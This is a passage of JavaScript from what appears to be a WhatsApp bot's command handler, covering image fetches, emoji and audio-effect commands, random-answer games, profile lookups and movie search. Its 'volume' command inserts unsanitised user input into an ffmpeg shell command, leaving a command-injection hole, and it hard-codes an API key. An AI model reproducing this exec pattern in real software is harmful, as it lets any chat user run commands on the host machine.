case 'animeslap':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animecuddle':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animewaifu':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animenom':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animefoxgirl':{
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await TsunadeBot.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: message.success}, { quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animetickle': {
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await TsunadeBot.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: message.success},{ quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animegecg': {
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await TsunadeBot.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: message.success},{ quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'dogwoof': {
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await TsunadeBot.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: message.success},{ quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case '8ballpool': {
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await TsunadeBot.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: message.success},{ quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'goosebird': {
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await TsunadeBot.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: message.success},{ quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animefeed': {
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await TsunadeBot.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: message.success},{ quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'animeavatar': {
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await TsunadeBot.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: message.success},{ quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'lizardpic': {
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await TsunadeBot.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: message.success},{ quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
case 'catmeow': {
await MznKingWaitReply()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await TsunadeBot.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: message.success},{ quoted:m }).catch(err => {
                    return('${errorReply}')
                })
                }
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replygcmznking("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replygcmznking("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replygcmznking("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replygcmznking("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replygcmznking("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replygcmznking("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replygcmznking("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replygcmznking("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replygcmznking("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replygcmznking("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replygcmznking("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "9")
case 'pediaemoji': 
if (!q) return replygcmznking("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
await MznKingWaitReply()
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replygcmznking('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await TsunadeBot.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await TsunadeBot.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replygcmznking(`Example: ${prefix + command} 10`)
media = await TsunadeBot.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcmznking('${errorReply}')
jadie = fs.readFileSync(rname)
TsunadeBot.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcmznking('${errorReply}')
jadie = fs.readFileSync(rname)
TsunadeBot.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replygcmznking("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replygcmznking('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replygcmznking(body)
  } catch (e) {
  replygcmznking(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replygcmznking(`Where is the link?\nExample :\n${prefix}${command} https://github.com/mznking/assets`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcmznking(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    TsunadeBot.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcmznking(mess.error))
break
case "spotify":{
if (!text) return replygcmznking(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return replygcmznking(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `🧚 *Title:* ${name || ''}\n🧚 *Artists:* ${(artists || []).join(
            ','
        )}\n🧚 *Album:* ${album_name}\n🧚 *Release Date:* ${release_date || ''}`
       const response = await TsunadeBot.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await TsunadeBot.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
        }
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await MznKingWaitReply()
                let media = await TsunadeBot.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcmznking(err)
                let buff = fs.readFileSync(ran)
                TsunadeBot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcmznking(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcmznking(e)
                }
                break
                case 'define': 
if (!q) return replygcmznking(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcmznking(mess.error)
const reply = `
*🧚 Word:* ${q}
*🧚 Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*🧚 Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   TsunadeBot.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replygcmznking(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return replygcmznking(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replygcmznking(jawab)
            }
            break
            case 'is': {
            	if (!text) return replygcmznking(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await replygcmznking(jawab)
            }
            break
            case 'when': {
            	if (!text) return replygcmznking(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await replygcmznking(jawab)
            }
            break
case 'what': {
            	if (!text) return replygcmznking(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await replygcmznking(jawab)
            }
            break
case 'where': {
if (!text) return replygcmznking(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replygcmznking(jawab)
            }
            break
case 'how': {
            	if (!text) return replygcmznking(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await replygcmznking(jawab)
            }
            break
case 'rate': {
            	if (!text) return replygcmznking(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await replygcmznking(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcmznking(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const mznkingkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
TsunadeBot.sendMessage(m.chat, { text: mznkingkak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) return MznKingGroupReply()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
TsunadeBot.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./assets/theme/TsunadeBot-1.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return MznKingGroupReply()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
TsunadeBot.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./assets/theme/TsunadeBot-1.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                TsunadeBot.sendMessage(m.chat, {caption: message.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return replygcmznking('*Please provide a query for search.*')
                await MznKingWaitReply()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                TsunadeBot.sendMessage(m.chat, {caption: `🧚 Title : ${result.title}\n🧚 Category : ${result.type}\n🧚 Detail : ${result.source}\n🧚 Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return replygcmznking('*Please provide a query for search in wikimedia.*')
                await MznKingWaitReply()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                TsunadeBot.sendMessage(m.chat, {caption: `🧚 Title : ${result.title}\n🧚 Source : ${result.source}\n🧚 Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            case 'pick': {
            	if (!m.isGroup) return MznKingGroupReply()
            	if (!text) return replygcmznking(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await TsunadeBot.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let mznkingshimts = member[Math.floor(Math.random() * member.length)]
             TsunadeBot.sendMessage(from, { 
text: `The most *${text}* here is *@${mznkingshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[mznkingshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./assets/theme/TsunadeBot-1.jpg`),
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
case 'igstalk': {
if (!args[0]) return replygcmznking(`Enter Instagram Username\n\nExample: ${prefix + command} unucorn_mznking13`)
const fg = require('api-dylux')
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
➢ *🔖Name:* ${res.name} 
➢ *🔖Username:* ${res.username}
➢ *👥Follower:* ${res.followersH}
➢ *🫂Following:* ${res.followingH}
➢ *📌Bio:* ${res.description}
➢ *🏝️Posts:* ${res.postsH}
➢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await TsunadeBot.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
      } catch {
        replygcmznking(`Make sure the username comes from *Instagram*`)
      }
}
break
    case 'say': case 'tts': case 'gtts':{
if (!text) return replygcmznking('Where is the text?')
            let texttts = text
            const mznkingrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return TsunadeBot.sendMessage(m.chat, {
                audio: {
                    url: mznkingrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replygcmznking(`🧚 *Fact:* ${data.fact}\n`)   
    }
    break
    case 'aixxx': case 'openaixxx':
try {
if (global.keyopenai === '') return replygcmznking("Api key limi exceeded");
if (!q) return replygcmznking(`Chat with AI.\n\nExample:\n${prefix + command} What is coding`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: q,
temperature: 0.3,
max_tokens: 2000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
replygcmznking(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
replygcmznking("Sorry, there seems to be an error :"+ error.message);
}
}
break
case "aimagexxx":
try {
if (global.keyopenai === '') return replygcmznking("Apikey limit exceeded");
if (!q) return replygcmznking(`Generate image from AI.\n\nExample:\n${prefix + command} man riding horse`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
TsunadeBot.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
replygcmznking("Sorry, there seems to be an error :"+ err);
}
break
case 'myip': {
        if (!MznKingTheCreator) return MznKingOwnerReply()
        if (m.isGroup) return MznKingPrivateReply()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcmznking("🔎 My public IP address is: " + ip)
                    })
                })
            }
        break
        case 'mathquiz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                let { genMath, modes } = require('./lib/math')
                if (!text) return replygcmznking(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                TsunadeBot.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    replygcmznking("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'lyrics': {
if (!text) return replygcmznking(`*Please provide a song name for get lyrics.*\nFor example: ${prefix}lyrics Thunder`)
await MznKingWaitReply()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
replygcmznking(`
🧚 *SONG LYRICS* 🧚

➢ *Title:* ${result.title}
➢ *Author:* ${result.author}
➢ *Url:* ${result.link}

➢ *Lyrics:*
${result.lyrics}

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`.trim())
}
break
case 'gdrive': {
		if (!args[0]) return replygcmznking(`*Please provide a valid google drive url.*`)
	await MznKingWaitReply()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcmznking(`
🧚 *Google Drive DL* 🧚

➢ *Name:* ${res.fileName}
➢ *Size:* ${res.fileSize}
➢ *Type:* ${res.mimetype}

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`)
	TsunadeBot.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcmznking('*Please check link in public or try another link.*') 
  }
}
break
case 'invitegc': {
	if (!m.isGroup) return MznKingGroupReply()
	if (!isBotAdmins) return MznKingBotAdminReply()
if (!text) return replygcmznking(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 94789481495`)
if (text.includes('+')) return replygcmznking(`Enter the number together without *+*`)
if (isNaN(text)) return replygcmznking(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await TsunadeBot.groupInviteCode(group)
      await TsunadeBot.sendMessage(text+'@s.whatsapp.net', {text: `🧚 *GROUP INVITATION* 🧚\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replygcmznking(`*An invite link is sent to the user.*`) 
}
break
              case 'pinterest': {
              	if (!text) return replygcmznking(`*Please provide a query for get media from pinterest.*`)
await MznKingWaitReply()
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
TsunadeBot.sendMessage(m.chat, { image: { url: result }, caption: '➢ Media Url: '+result }, { quoted: m })
}
break
case 'ringtone': {
		if (!text) return replygcmznking(`*Please provide a query for download ringtone.\nFor example: ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		TsunadeBot.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
	case 'genshin':
if (!text) return replygcmznking(`\`\`\`🔍 Which genshin are you looking for?\`\`\``)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🧚 *TSUNADE ANIME SEARCH* 🧚\n\n`
txt += `🎀 *Name:* ${anime.name}\n`
txt += `🎖️ *Title:* ${anime.title}\n`
txt += `💠 *Vision:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n\n`
txt += `*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await TsunadeBot.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return replygcmznking('${errorReply}')
}
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/mznking/assets/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await TsunadeBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/mznking/assets/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await TsunadeBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/mznking/assets/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await TsunadeBot.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
	case 'anime': {
if (!text) return replygcmznking(`\`\`\`🔍 Which anime are you looking for?\`\`\``)
const malScraper = require('mal-scraper')
await MznKingWaitReply()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcmznking(`*Sorry, i can't find anything.*`)
let animetxt = `
🧚 *TSUNADE ANIME SEARCH* 🧚

🎀 *Title:* ${anime.title}
🎋 *Type:* ${anime.type}
🎐 *Premiered on:* ${anime.premiered}
💠 *Total Episodes:* ${anime.episodes}
📈 *Status:* ${anime.status}
💮 *Genres:* ${anime.genres}
📍 *Studio:*${anime.studios}
🌟 *Score:* ${anime.score}
💎 *Rating:* ${anime.rating}
🏅 *Rank:* ${anime.ranked}
💫 *Popularity:* ${anime.popularity}
♦️ *Trailer:* ${anime.trailer}
🌐 *URL:* ${anime.url}
❄ *Description:* ${anime.synopsis}

*© ＴＳＵＮＡＤＥ - ＭＤ  |  ２０２４*`
                await TsunadeBot.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
                case 'imdb':
if (!text) return replygcmznking(`*Please provide a name of movie or series for search in IMDb.*`)
await MznKingWaitReply()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "🧚 *TSUNADE IMDB SEARCH* 🧚\n\n"
            imdbt += "🎬 *Title:* " + fids.data.Title + "\n"
            imdbt += "📅 *Year:* " + fids.data.Year + "\n"
            imdbt += "⭐ *Rating:* " + fids.data.Rated + "\n"
            imdbt += "📆 *Release:* " + fids.data.Released + "\n"
            imdbt += "⏳ *Runtime:* " + fids.data.Runtime + "\n"
            imdbt += "🌀 *Genre:* " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻 *Director:* " + fids.data.Director + "\n"
            imdbt += "✍ *Writer:* " + fids.data.Writer + "\n"
            imdbt += "👨 *Actors:* " + fids.data.Actors + "\n"
            imdbt += "📃 *Plot:* " + fids.data.Plot + "\n"
